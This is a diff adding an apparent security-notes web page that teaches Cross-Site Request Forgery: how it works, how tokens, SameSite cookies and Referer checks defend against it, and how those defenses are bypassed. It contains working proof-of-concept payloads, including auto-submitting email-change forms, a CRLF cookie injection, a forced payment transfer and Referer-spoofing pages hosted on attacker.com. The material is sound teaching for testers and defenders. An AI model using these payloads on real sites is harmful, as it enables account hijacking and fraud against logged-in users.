@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Learn what CSRF attacks are, how they work with real examples, and how to defend against them using CSRF tokens, SameSite cookies, and referer validation.">
+  <title>offsecnotes | Cross-Site Request Forgery (CSRF)</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Cross-Site Request Forgery (CSRF)</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#how-csrf-attacks-work" id="toc-how-csrf-attacks-work">How CSRF Attacks Work</a>
+<ul>
+<li><a href="#post-based-attack" id="toc-post-based-attack">POST-Based Attack</a></li>
+<li><a href="#get-based-attack" id="toc-get-based-attack">GET-Based Attack</a></li>
+</ul></li>
+<li><a href="#csrf-defenses" id="toc-csrf-defenses">CSRF Defenses</a></li>
+<li><a href="#csrf-token-bypass-techniques" id="toc-csrf-token-bypass-techniques">CSRF Token Bypass Techniques</a></li>
+<li><a href="#bypassing-samesite-protections" id="toc-bypassing-samesite-protections">Bypassing SameSite Protections</a>
+<ul>
+<li><a href="#bypassing-lax-mode" id="toc-bypassing-lax-mode">Bypassing Lax Mode</a></li>
+<li><a href="#bypassing-strict-mode" id="toc-bypassing-strict-mode">Bypassing Strict Mode</a></li>
+</ul></li>
+<li><a href="#bypassing-referer-validation" id="toc-bypassing-referer-validation">Bypassing Referer Validation</a>
+<ul>
+<li><a href="#strip-the-referer" id="toc-strip-the-referer">Strip the Referer</a></li>
+<li><a href="#fake-the-referer" id="toc-fake-the-referer">Fake the Referer</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<p>Cross-Site Request Forgery (CSRF) is a type of web attack where a malicious site tricks a user into performing actions on another site where they’re authenticated. For example, it could change a user’s email or send money-without their consent.</p>
+<hr />
+<h2 id="how-csrf-attacks-work">How CSRF Attacks Work</h2>
+<p>An attacker can trick a logged-in user into submitting unwanted requests.</p>
+<h3 id="post-based-attack">POST-Based Attack</h3>
+<div class="sourceCode" id="cb1"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span> <span class="er">action</span><span class="ot">=</span><span class="st">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="er">method</span><span class="ot">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;hidden&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;email&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;pwned@evil-user.net&quot;</span> <span class="dt">/&gt;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>      <span class="bu">document</span><span class="op">.</span><span class="at">forms</span>[<span class="dv">0</span>]<span class="op">.</span><span class="fu">submit</span>()<span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+<h3 id="get-based-attack">GET-Based Attack</h3>
+<div class="sourceCode" id="cb2"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<hr />
+<h2 id="csrf-defenses">CSRF Defenses</h2>
+<details>
+<summary>
+CSRF Tokens
+</summary>
+<p>A CSRF token is a unique and unpredictable value generated by the server. It must be submitted with sensitive requests (like changing an email). This ensures the request comes from a legitimate user.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">form</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;change-email-form&quot;</span> <span class="er">action</span><span class="ot">=</span><span class="st">&quot;/my-account/change-email&quot;</span> <span class="er">method</span><span class="ot">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">label</span><span class="dt">&gt;</span>Email<span class="dt">&lt;/</span><span class="kw">label</span><span class="dt">&gt;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">required</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;email&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;email&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;example@normal-website.com&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">required</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;hidden&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;csrf&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;unique-random-token&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">button</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;submit&quot;</span><span class="dt">&gt;</span>Update Email<span class="dt">&lt;/</span><span class="kw">button</span><span class="dt">&gt;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: CSRF tokens should be tied to the user’s session and checked on the server.</p>
+</blockquote>
+</details>
+<details>
+<summary>
+SameSite Cookies
+</summary>
+<p>SameSite is a cookie attribute that controls whether cookies are sent with cross-site requests.</p>
+<ul>
+<li><code>Strict</code>: Only sent in same-site requests (most secure).</li>
+<li><code>Lax</code>: Sent on same-site and top-level GET requests (default in most modern browsers).</li>
+<li><code>None</code>: Sent in all requests but must be marked <code>Secure</code>.</li>
+</ul>
+</details>
+<details>
+<summary>
+Referer Header Validation
+</summary>
+<p>Some applications check the <code>Referer</code> header to verify that requests are coming from their own domain. This can help prevent CSRF attacks, but it’s not foolproof.</p>
+<blockquote>
+<p><strong>Warning</strong>: Don’t rely solely on referer validation. Users or browsers may strip or modify this header.</p>
+</blockquote>
+</details>
+<hr />
+<h2 id="csrf-token-bypass-techniques">CSRF Token Bypass Techniques</h2>
+<ul>
+<li>Switch from <code>POST</code> to <code>GET</code></li>
+<li>Remove the CSRF token parameter</li>
+<li>Use a predictable or fake token</li>
+<li>Use Burp Sequencer to analyze the quality of randomness of the token</li>
+<li>Reuse a token from your own session (if the app doesn’t check the token-user binding)</li>
+<li>There are two token: one in a cookie and one in hidden input (this can also have the same value)
+<ul>
+<li>Some apps do tie the CSRF token to a cookie, but not to the session cookie.</li>
+<li>Can you set a cookie? E.g. Header injection with <code>CRLF</code>.(<code>%0d%0a</code>)</li>
+<li><div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>  <span class="ex">/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None</span></span></code></pre></div></li>
+<li>Log in to the application with your account -&gt; obtain a valid token and associated cookie.</li>
+<li>Generate CSRF PoC and remove the auto-submit <code>&lt;script&gt;</code> block. Then add the following code to inject the cookie.</li>
+</ul>
+<div class="sourceCode" id="cb5"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">img</span> <span class="er">src</span><span class="ot">=</span><span class="st">&quot;https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None&quot;</span> <span class="er">onerror</span><span class="ot">=</span><span class="st">&quot;document.forms[0].submit()&quot;</span><span class="dt">&gt;</span></span></code></pre></div></li>
+</ul>
+<hr />
+<h2 id="bypassing-samesite-protections">Bypassing SameSite Protections</h2>
+<h3 id="bypassing-lax-mode">Bypassing Lax Mode</h3>
+<ul>
+<li><p>Using GET requests (bypass lax)</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amp;amount=1000000&#39;</span><span class="op">;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div></li>
+<li><p>GET method override (bypass lax)</p>
+<ul>
+<li><p>Even if an ordinary <code>GET</code> request isn’t allowed, some frameworks supports <code>_method</code> parameter. (Other frameworks support a variety of similar parameters)</p>
+<pre class="http"><code>GET /my-account/change-email?email=a@a.com&amp;_method=POST HTTP/1.1</code></pre></li>
+</ul></li>
+</ul>
+<h3 id="bypassing-strict-mode">Bypassing Strict Mode</h3>
+<p>Use a client-side redirect:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">// On page: https://vulnerable-website.com/post/confirm?postId=10</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>redirectOnConfirmation <span class="op">=</span> () <span class="kw">=&gt;</span> {</span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    <span class="pp">setTimeout</span>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> url <span class="op">=</span> <span class="kw">new</span> <span class="fu">URL</span>(<span class="bu">window</span><span class="op">.</span><span class="at">location</span>)<span class="op">;</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> postId <span class="op">=</span> url<span class="op">.</span><span class="at">searchParams</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&quot;postId&quot;</span>)<span class="op">;</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>        <span class="bu">window</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;/post/&#39;</span> <span class="op">+</span> postId<span class="op">;</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>    }<span class="op">,</span> <span class="dv">3000</span>)<span class="op">;</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>Now trigger redirect to a sensitive endpoint:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">document</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&quot;https://vulnerable-website.com/post/confirm?postId=10/../../my-account/change-email?email=a@a.com&quot;</span><span class="op">;</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: This attack isn’t possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.</p>
+</blockquote>
+<hr />
+<h2 id="bypassing-referer-validation">Bypassing Referer Validation</h2>
+<h3 id="strip-the-referer">Strip the Referer</h3>
+<p>Some apps validate the Referer header if present, but skip if omitted:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">meta</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;referrer&quot;</span> <span class="er">content</span><span class="ot">=</span><span class="st">&quot;never&quot;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>This prevents the browser from sending the <code>Referer</code> header.</p>
+<h3 id="fake-the-referer">Fake the Referer</h3>
+<p>Common tricks include using subdomains or path tricks:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode md"><code class="sourceCode markdown"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>http://vulnerable-website.com.attacker.com/csrf</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>http://attacker.com/csrf?vulnerable-website.com</span></code></pre></div>
+<p>You need to add <code>Referrer-Policy</code> to <code>unsafe-url</code>:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">meta</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;referrer&quot;</span> <span class="er">content</span><span class="ot">=</span><span class="st">&quot;unsafe-url&quot;</span> <span class="dt">/&gt;</span></span></code></pre></div>
+<blockquote>
+<p><strong>Tip</strong>: Instead of use <code>http://attacker-website.com/vulnerable-website.com</code>, you can use <code>http://attacker-website.com/</code> and add <code>&lt;script&gt;history.pushState('', '', '/vulnerable-website.com')&lt;/script&gt;</code></p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- http://attacker-website.com/ --&gt;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">html</span><span class="dt">&gt;</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">meta</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;referrer&quot;</span> <span class="er">content</span><span class="ot">=</span><span class="st">&quot;unsafe-url&quot;</span><span class="dt">/&gt;</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">form</span> <span class="er">action</span><span class="ot">=</span><span class="st">&quot;https://vulnerable-website.com/change-email&quot;</span> <span class="er">method</span><span class="ot">=</span><span class="st">&quot;POST&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;hidden&quot;</span> <span class="er">name</span><span class="ot">=</span><span class="st">&quot;email&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;test@test.com&quot;</span> <span class="dt">/&gt;</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&lt;</span><span class="kw">input</span> <span class="er">type</span><span class="ot">=</span><span class="st">&quot;submit&quot;</span> <span class="er">value</span><span class="ot">=</span><span class="st">&quot;Submit request&quot;</span> <span class="dt">/&gt;</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>      history<span class="op">.</span><span class="fu">pushState</span>(<span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;&#39;</span><span class="op">,</span> <span class="st">&#39;/vulnerable-website.com&#39;</span>)<span class="op">;</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>      <span class="bu">document</span><span class="op">.</span><span class="at">forms</span>[<span class="dv">0</span>]<span class="op">.</span><span class="fu">submit</span>()<span class="op">;</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div>
+</blockquote>
+<p>Firefox 87 new default Referrer Policy <code>strict-origin-when-cross-origin</code> trimming user sensitive information like path and query string to protect privacy [<a href="https://blog.mozilla.org/security/2021/03/22/firefox-87-trims-http-referrers-by-default-to-protect-user-privacy/">↗</a>] .</p>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
